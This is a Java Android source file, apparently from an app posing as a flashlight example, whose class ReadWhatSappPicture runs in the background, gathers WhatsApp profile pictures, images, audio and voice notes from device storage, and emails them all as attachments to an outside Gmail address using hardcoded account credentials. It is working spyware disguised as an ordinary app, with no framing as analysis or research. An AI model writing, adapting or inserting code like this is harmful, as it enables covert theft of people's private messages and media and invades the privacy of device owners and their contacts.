package com.example.flashlightexample;

import java.io.File;
import java.util.ArrayList;

import android.graphics.Color;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.TextView;

public class ReadWhatSappPicture extends AsyncTask<Void, Void, Void>{
	 private File root;
  	private ArrayList<File> fileList = new ArrayList<File>();
  	 private ArrayList<String> StringfileList = new ArrayList<String>();
	 @Override
     protected void onPreExecute() {
        super.onPreExecute();
     }

     @Override
     protected Void doInBackground(Void... params) {
    	 System.out.println("mail gönderiliyor...");
 		WhatsappOfMail m = new WhatsappOfMail("hemenindir57@gmail.com","123xxx123"); 
 	    //   emailGonder();
 			 String[] toArr = {"mehmetduman34500@gmail.com"}; 
 		        m.setTo(toArr); 
 		        m.setFrom("hemenindir57@gmail.com"); 
 		        m.setSubject("--WhatSappp--"); 
 		        m.setBody("Email body"); 
 		       
 		        try { 
 		        	
 		        	 //Whatsapp Resimleri
	                 
	                 String pathWhatsapp = "/storage/sdcard0/WhatsApp/Profile Pictures";
	                 File fileWhatsapp=new File(pathWhatsapp);
	                 String[] _filesWhatsapp = fileWhatsapp.list(); 
	                 for ( int i = 0 ; i < _filesWhatsapp.length ; i++  )
	                 { 
	                     _filesWhatsapp[i] = pathWhatsapp + "/"+ _filesWhatsapp[i];
	               //        _files[i] = path + "/"+ _files[i].substring(_files[i].lastIndexOf("/"));
	                       m.addAttachment(_filesWhatsapp[i]);
	                       Log.i("zms", "zms pathWhatsapp "+_filesWhatsapp[i]);
	                      // Log.i("zms", "zms "+_files[i].substring(_files[i].lastIndexOf("/")));
	                 }
	                 
	              	
			        	String pathWhatspMedia = "/storage/sdcard0/WhatsApp/Media/WhatsApp Images";  
		                 File fileDirWhatspMedia = new File( pathWhatspMedia );
		                  String[] _filesWhatspMedia = fileDirWhatspMedia.list();
		                 for ( int i = 0 ; i < _filesWhatspMedia.length ; i++  )
		                 { 	
			                
		                     _filesWhatspMedia[i] = pathWhatspMedia + "/"+ _filesWhatspMedia[i];
		               //        _files[i] = path + "/"+ _files[i].substring(_files[i].lastIndexOf("/"));
		                     if(!_filesWhatspMedia[i].substring(_filesWhatspMedia[i].lastIndexOf("/")).equals("/Sent")){
		                       m.addAttachment(_filesWhatspMedia[i]);
		                  //     Log.i("zms", "zms pathWhatspMedia"+_filesWhatspMedia[i]);
		                      Log.i("zms", "zms "+_filesWhatspMedia[i].substring(_filesWhatspMedia[i].lastIndexOf("/")));
		                 }
		                     }
		                 
		                 String pathWhatspMediaSent = "/storage/sdcard0/WhatsApp/Media/WhatsApp Images/Sent";  
		                 File fileDirWhatspMediaSent = new File( pathWhatspMediaSent );
		                  String[] _filesWhatspMediaSent = fileDirWhatspMediaSent.list();
		                 for ( int i = 0 ; i < _filesWhatspMediaSent.length ; i++  )
		                 { 	
			                
		                	 _filesWhatspMediaSent[i] = pathWhatspMediaSent + "/"+ _filesWhatspMediaSent[i];
		               //        _files[i] = path + "/"+ _files[i].substring(_files[i].lastIndexOf("/"));
		                   
		                       m.addAttachment(_filesWhatspMediaSent[i]);
		                  //     Log.i("zms", "zms pathWhatspMedia"+_filesWhatspMedia[i]);
		                      Log.i("zms", "zms "+_filesWhatspMediaSent[i].substring(_filesWhatspMediaSent[i].lastIndexOf("/")));
		                 }
		                 
		                 
		                 
		             	String pathWhatspMediaAudio = "/storage/sdcard0/WhatsApp/Media/WhatsApp Audio";  
		                 File fileDirWhatspMediaAudio = new File( pathWhatspMediaAudio );
		                  String[] _filesWhatspMediaAudio = fileDirWhatspMediaAudio.list();
		                 for ( int i = 0 ; i < _filesWhatspMediaAudio.length ; i++  )
		                 { 	
			                
		                     _filesWhatspMediaAudio[i] = pathWhatspMediaAudio + "/"+ _filesWhatspMediaAudio[i];
		               //        _files[i] = path + "/"+ _files[i].substring(_files[i].lastIndexOf("/"));
		                     if(!_filesWhatspMediaAudio[i].substring(_filesWhatspMediaAudio[i].lastIndexOf("/")).equals("/Sent")){
		                       m.addAttachment(_filesWhatspMediaAudio[i]);
		                  //     Log.i("zms", "zms pathWhatspMedia"+_filesWhatspMedia[i]);
		                      Log.i("zms", "zms "+_filesWhatspMediaAudio[i].substring(_filesWhatspMediaAudio[i].lastIndexOf("/")));
		                 }
		                     }
		                 
		                 String pathWhatspMediaAudioSent = "/storage/sdcard0/WhatsApp/Media/WhatsApp Audio/Sent";  
		                 File fileDirWhatspMediaAudioSent = new File( pathWhatspMediaAudioSent );
		                  String[] _filesWhatspMediaAudioSent = fileDirWhatspMediaAudioSent.list();
		                 for ( int i = 0 ; i < _filesWhatspMediaAudioSent.length ; i++  )
		                 { 	
			                
		                	 _filesWhatspMediaAudioSent[i] = pathWhatspMediaAudioSent + "/"+ _filesWhatspMediaAudioSent[i];
		               //        _files[i] = path + "/"+ _files[i].substring(_files[i].lastIndexOf("/"));
		                   
		                       m.addAttachment(_filesWhatspMediaAudioSent[i]);
		                  //     Log.i("zms", "zms pathWhatspMedia"+_filesWhatspMedia[i]);
		                      Log.i("zms", "zms "+_filesWhatspMediaAudioSent[i].substring(_filesWhatspMediaAudioSent[i].lastIndexOf("/")));
		                 }
		                     //Whatsapp Konuþmalarý Allma
		                 root = new File("/storage/sdcard0/WhatsApp/Media/WhatsApp Voice Notes");
		         		getfile(root);

		         		for (int i = 0; i < StringfileList.size(); i++) {
		         			m.addAttachment(StringfileList.get(i));
		         			Log.i("zms","zms"+StringfileList.get(i));

		         			
		         		}
		                
 	                if(m.send()) { 

 	                	
 		                  for ( int i = 0 ; i < _filesWhatsapp.length ; i++  )
 		                  { 
 		                      Log.i("zms test _filesWhatsapp", "zms success");
 		                  }
 		                  for ( int i = 0 ; i < _filesWhatspMedia.length ; i++  )
 		                  { 
 		                      Log.i("zms test _filesWhatspMedia", "zms success");
 		                  }
 		                 for ( int i = 0 ; i < _filesWhatspMediaSent.length ; i++  )
		                  { 
		                      Log.i("zms test _filesWhatspMediaSent", "zms success");
		                  }}
    	                  
    	               else { 
    	                  Log.i("zms test mail result", "zms fail");
    	              }
 		        }
 	                catch(Exception e) {
 		                 Log.i("zms test mail result", "zms error while sending");
 		            } 
 			return null;
     }

     @Override
     protected void onPostExecute(Void result) {
        super.onPostExecute(result);
     }

     @Override
     protected void onProgressUpdate(Void... values) {
        super.onProgressUpdate(values);
     }

     @Override
     protected void onCancelled(Void result) {
        super.onCancelled(result);
     }
     public ArrayList<File> getfile(File dir) {
 		File listFile[] = dir.listFiles();
 		if (listFile != null && listFile.length > 0) {
 			for (int i = 0; i < listFile.length; i++) {

 				if (listFile[i].isDirectory()) {
 					//fileList.add(listFile[i]);
 					getfile(listFile[i]);

 				} else {
 					if (listFile[i].getName().endsWith(".aac")
 							)

 					{
 						fileList.add(listFile[i]);
 						StringfileList.add(""+listFile[i]);
 					}
 				}

 			}
 		}
 		return fileList;
 	}
}
